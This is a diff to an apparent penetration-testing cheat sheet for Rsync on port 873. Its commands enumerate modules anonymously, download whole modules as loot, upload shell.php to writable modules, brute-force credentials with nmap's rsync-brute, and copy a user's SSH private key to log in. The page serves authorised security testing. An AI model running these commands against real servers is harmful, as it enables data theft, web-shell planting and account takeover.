@@ -1,7 +1,7 @@
 # Rsync (873)
 
 !!! tip "Start here"
-    List modules anonymously: `rsync -av --list-only rsync://$IP`. If modules appear, pull them without credentials: `rsync -av rsync://$IP/<module> ./`. Look for SSH keys, config backups, and database dumps in what comes back.
+    List modules anonymously: `rsync -av --list-only rsync://$IP`. If modules appear, set `$MODULE` to the selected name and inspect it before downloading data.
 
 ---
 
@@ -18,10 +18,10 @@ rsync -av --list-only rsync://$IP
 
 ```bash
 # Entire module
-rsync -av rsync://$IP/<module> ./loot/
+rsync -av "rsync://$IP/$MODULE" ./loot/
 
 # Single file
-rsync -av rsync://$IP/<module>/path/to/file.txt ./
+rsync -av "rsync://$IP/$MODULE/path/to/file.txt" ./
 ```
 
 ---
@@ -31,7 +31,7 @@ rsync -av rsync://$IP/<module>/path/to/file.txt ./
 If the module is writable:
 
 ```bash
-rsync -av ./shell.php rsync://$IP/<module>/path/
+rsync -av ./shell.php "rsync://$IP/$MODULE/path/"
 ```
 
 ---
@@ -39,8 +39,11 @@ rsync -av ./shell.php rsync://$IP/<module>/path/
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt rsync://$IP
+nmap -p 873 --script rsync-brute \
+  --script-args "rsync-brute.module=$MODULE,userdb=users.txt,passdb=passwords.txt" $IP
 ```
+
+`rsync-brute` is intrusive. Set the module name explicitly and constrain the username/password sources and attempt count to the approved test plan.
 
 ---
 
@@ -49,10 +52,7 @@ hydra -L users.txt -P passwords.txt rsync://$IP
 If home directories are exposed:
 
 ```bash
-rsync -av rsync://$IP/<module>/home/user/.ssh/id_rsa ./
+rsync -av "rsync://$IP/$MODULE/home/$USERNAME/.ssh/id_rsa" ./
 chmod 600 id_rsa
 ssh -i id_rsa user@$IP
 ```
-
-!!! tip "Real-world"
-    Rsync without authentication is a misconfiguration that mostly shows up on backup servers and internal infrastructure. Modules that expose `/home`, `/etc`, or application directories are high-value. Pull everything and grep offline. Write access to a web-accessible path is a direct shell upload.
